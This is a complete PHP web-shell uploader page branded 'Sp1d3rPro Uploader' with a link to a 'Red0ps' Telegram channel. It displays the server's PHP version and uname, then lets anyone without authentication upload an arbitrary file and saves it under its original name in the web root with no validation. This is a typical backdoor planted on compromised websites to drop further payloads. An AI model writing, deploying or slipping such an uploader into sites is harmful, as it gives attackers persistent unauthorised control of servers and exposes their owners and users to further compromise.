<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sp1d3rPro Uploader</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
  body {
    margin: 0;
    background: #0d0d0d;
    color: #0f0;
    font-family: 'Share Tech Mono', monospace;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    height: 100vh;
  }
  .container {
    background: #111;
    padding: 25px 20px;
    border-radius: 10px;
    text-align: center;
    border: 1px solid #0f0;
    box-shadow: 0 0 15px #0f0a;
    width: 100%;
    max-width: 450px;
  }
  h1 {
    margin-bottom: 10px;
    font-size: 1.8rem;
    text-shadow: 0 0 5px #0f0;
  }
  p {
    font-size: 0.85rem;
    margin: 2px 0;
    color: #0f9;
  }
  input[type="file"],
  input[type="submit"] {
    width: 100%;
    padding: 10px;
    margin-top: 12px;
    border-radius: 6px;
    border: 1px solid #0f0;
    background: #111;
    color: #0f0;
    cursor: pointer;
    font-family: 'Share Tech Mono', monospace;
    transition: 0.2s;
  }
  input[type="file"]:hover,
  input[type="submit"]:hover {
    background: #0f0;
    color: #111;
    box-shadow: 0 0 8px #0f0;
  }
  .message {
    margin-top: 15px;
    font-weight: bold;
  }
  .success { color: #0f0; }
  .error { color: #f33; }
  .telegram-btn {
    margin-top: 35px;
    width: 100%;
    max-width: 470px;
    padding: 12px;
    border: 1px solid #0f0;
    border-radius: 6px;
    text-decoration: none;
    color: #0f0;
    font-weight: bold;
    text-align: center;
    text-shadow: 0 0 3px #0f0;
    display: inline-block;
    box-shadow: 0 0 15px #0f0a;
    transition: 0.3s;
  }
  .telegram-btn:hover {
    background: #0f0;
    color: #111;
    box-shadow: 0 0 20px #0f0, 0 0 30px #0f0a, 0 0 40px #0f0a;
    transform: translateY(-2px);
  }
</style>
</head>
<body>
  <div class="container">
    <h1>Sp1d3rPro Uploader</h1>
    <p>PHP: <?php echo phpversion(); ?></p>
    <p>Server: <?php echo php_uname(); ?></p>
    <form method="post" enctype="multipart/form-data">
      <input type="file" name="zb" required>
      <input type="submit" name="upload" value="Upload">
    </form>
    <?php
    if(isset($_POST['upload'])) {
      if(@move_uploaded_file($_FILES['zb']['tmp_name'], $_FILES['zb']['name'])) {
        echo '<div class="message success">File uploaded successfully</div>';
      } else {
        echo '<div class="message error">Upload failed</div>';
      }
    }
    ?>
  </div>
  <a href="https://t.me/Red0ps" target="_blank" class="telegram-btn">Join Telegram</a>
</body>
</html>
